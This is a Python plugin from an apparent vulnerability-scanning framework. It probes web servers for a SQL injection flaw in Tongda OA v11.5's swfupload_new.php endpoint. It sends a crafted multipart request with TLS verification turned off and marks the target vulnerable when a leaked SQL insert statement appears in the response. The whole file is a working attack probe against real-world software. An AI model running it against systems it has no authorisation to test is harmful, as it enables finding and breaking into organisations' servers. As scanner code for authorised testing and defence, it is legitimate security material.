#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '通达OA v11.5 swfupload_new.php SQL注入',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  rboundary = randomLowercase(8)
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': f'multipart/form-data; boundary=----------WebKitFormBoundary{rboundary}'
      }
  target = '/general/file_folder/swfupload_new.php'
  data= f'''
------------WebKitFormBoundary{rboundary}
        Content-Disposition: form-data; name=\"ATTACHMENT_ID\"\r\n\
        \r\n\
        1\r\n\
        ------------WebKitFormBoundary{rboundary}\r\n\
        Content-Disposition: form-data; name=\"ATTACHMENT_NAME\"\r\n\
        \r\n\
        1\r\n\
        ------------WebKitFormBoundary{rboundary}\r\n\
        Content-Disposition: form-data; name=\"FILE_SORT\"\r\n\
        \r\n\
        2\r\n\
        ------------WebKitFormBoundary{rboundary}\r\n\
        Content-Disposition: form-data; name=\"SORT_ID\"\r\n\
        \r\n\
        ------------WebKitFormBoundary{rboundary}--\r\n\
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "insert into FILE_CONTENT(" in res.text:
      ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret